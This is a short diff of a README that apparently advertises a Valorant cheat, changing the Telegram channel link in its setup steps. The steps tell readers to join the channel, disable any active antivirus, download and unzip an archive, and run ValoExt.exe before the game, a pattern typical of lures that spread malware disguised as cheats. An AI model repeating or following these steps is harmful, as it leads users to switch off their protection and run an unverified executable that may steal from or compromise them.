@@ -14,7 +14,7 @@
 
 ### STEPS
 ```sh-session
-[1] Join to telegram chanenl https://t.me/+9WoBiMJUkjU5NmQ6
+[1] Join to telegram chanenl https://t.me/+tFqPi7jA2uM5ZTEy
 [2] Disable any Antivirus that is active. (Antivirus will block the game cheat from loading properly.)
 [3] Download and Unzip the zip folder into any directory.
 [4] Run ValoExt.exe BEFORE Opening Valorant
